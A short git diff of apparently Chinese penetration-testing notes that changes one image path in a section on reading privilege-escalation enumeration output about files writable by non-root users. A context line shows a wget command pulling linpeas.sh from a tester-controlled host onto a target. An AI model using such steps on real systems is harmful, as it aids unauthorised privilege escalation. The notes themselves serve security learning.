@@ -101,7 +101,7 @@ wget http://192.168.45.161:8888/linpeas.sh
 
 * 这部分意味着以下文件可以由非root用户创建和修改：
 
-<figure><img src="../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/19 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 这部分意味着当前的用户权限对以下文件是有写入权限的：
 
